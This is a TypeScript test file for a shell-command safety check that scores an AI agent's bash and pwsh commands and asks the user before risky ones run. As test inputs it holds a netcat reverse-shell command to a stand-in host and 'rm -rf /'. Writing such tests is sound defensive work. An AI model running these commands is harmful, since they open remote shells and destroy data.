import { chmod, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { ToolExecution } from '@deepseek-ai/dsh-tools'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { LocalClient } from '../src/client.ts'
import { checkCommand, shellCommandOf } from '../src/command.ts'
import type { CommandParams, CommandResult } from '../src/protocol.ts'
import type { Gate } from '../src/response.ts'

const exec = (name: string, args: unknown) => ({ name, arguments: args, callId: 'call-731', signal: new AbortController().signal }) as unknown as ToolExecution
function gate(result: CommandResult | Error, calls: CommandParams[] = []): Gate {
  const client = { checkCommand: async (params: CommandParams) => { calls.push(params); if (result instanceof Error) throw result; return result } }
  return { signal: new AbortController().signal, runtimeFor: async () => ({ client }), sessionFor: () => 'session-capability-0000000000000731' } as unknown as Gate
}
const on = () => true

describe('DeepSeek pre-execution shell command check', () => {
  it('checks only the command line of bash and pwsh', async () => {
    expect(shellCommandOf(exec('bash', { command: 'ls', description: 'list' }))).toBe('ls')
    expect(shellCommandOf(exec('pwsh', { command: 'Get-ChildItem' }))).toBe('Get-ChildItem')
    expect(shellCommandOf(exec('read', { path: '/x' }))).toBeUndefined()
    const calls: CommandParams[] = []
    await checkCommand(exec('bash', { command: 'git status' }), gate({ status: 'approved', category: 'shell_command' }, calls), on)
    expect(calls).toEqual([{ session: 'session-capability-0000000000000731', tool: 'bash', call_id: 'call-731', command: 'git status' }])
  })

  it('asks even for a high score: Patronus never blocks a command on its own', async () => {
    const decision = await checkCommand(exec('bash', { command: 'nc -e /bin/sh x 4444' }), gate({ status: 'dangerous', category: 'shell_command', risk: 'medium', decision_score: 10 }), on)
    expect(decision).toMatchObject({ kind: 'ask' })
    expect((decision as { reason: string }).reason).toMatch(/shell-command risk, score 10\.0/)
  })

  it('asks the user for medium risk through the approval service', async () => {
    const decision = await checkCommand(exec('bash', { command: 'npm install' }), gate({ status: 'dangerous', category: 'shell_command', risk: 'medium', decision_score: 2.5 }), on)
    expect(decision).toMatchObject({ kind: 'ask' })
  })

  it('lets a low-risk command run without asking', async () => {
    expect(await checkCommand(exec('bash', { command: 'npm install' }), gate({ status: 'dangerous', category: 'shell_command', risk: 'low', decision_score: 1.8 }), on)).toBeUndefined()
  })

  it('lets the command run when the check is off, unavailable or failing', async () => {
    const command = exec('bash', { command: 'rm -rf /' })
    expect(await checkCommand(command, gate({ status: 'dangerous', category: 'shell_command', risk: 'medium' }), () => false)).toBeUndefined()
    expect(await checkCommand(command, gate({ status: 'unavailable', category: 'shell_command', reason: 'shell_model_missing' }), on)).toBeUndefined()
    expect(await checkCommand(command, gate(Error('runtime down')), on)).toBeUndefined()
  })
})

// A stand-in runtime that answers check_command with the verdict named by the command, so the
// real LocalClient framing and response validation run without the shell model.
const runtime = `#!/usr/bin/env node
const verdicts = {
  low: { status: 'dangerous', category: 'shell_command', risk: 'low', decision_score: 1.8, threshold: 0.475 },
  medium: { status: 'dangerous', category: 'shell_command', risk: 'medium', decision_score: 7.6, threshold: 0.475 },
  approved: { status: 'approved', category: 'shell_command', decision_score: 0.1, threshold: 0.475 },
  high: { status: 'dangerous', category: 'shell_command', risk: 'high', decision_score: 9, threshold: 0.475 },
}
let buffer = ''
process.stdin.on('data', chunk => {
  buffer += chunk
  let newline
  while ((newline = buffer.indexOf('\\n')) >= 0) {
    const { id, params } = JSON.parse(buffer.slice(0, newline))
    buffer = buffer.slice(newline + 1)
    process.stdout.write(JSON.stringify({ id, result: verdicts[params.command] }) + '\\n')
  }
})
`

let directory: string
const clients: LocalClient[] = []
beforeAll(async () => {
  directory = await mkdtemp(join(tmpdir(), 'patronus-client-'))
  await writeFile(join(directory, 'runtime.mjs'), runtime)
  await chmod(join(directory, 'runtime.mjs'), 0o755)
})
afterAll(async () => {
  await Promise.all(clients.map(client => client.close()))
  await rm(directory, { recursive: true, force: true })
})

async function check(command: string) {
  const client = new LocalClient({ executable: join(directory, 'runtime.mjs'), stateDir: join(directory, 'state') })
  clients.push(client)
  return client.checkCommand({ session: 'session-capability-0000000000000731', tool: 'bash', call_id: 'call-731', command })
}

it('LocalClient accepts both risk bands of a flagged shell command from the runtime', async () => {
  expect(await check('low')).toMatchObject({ status: 'dangerous', risk: 'low', decision_score: 1.8 })
  expect(await check('medium')).toMatchObject({ status: 'dangerous', risk: 'medium', decision_score: 7.6 })
  expect(await check('approved')).toMatchObject({ status: 'approved' })
})

it('LocalClient rejects a risk band the protocol does not define', async () => {
  await expect(check('high')).rejects.toThrow(/invalid response/)
})
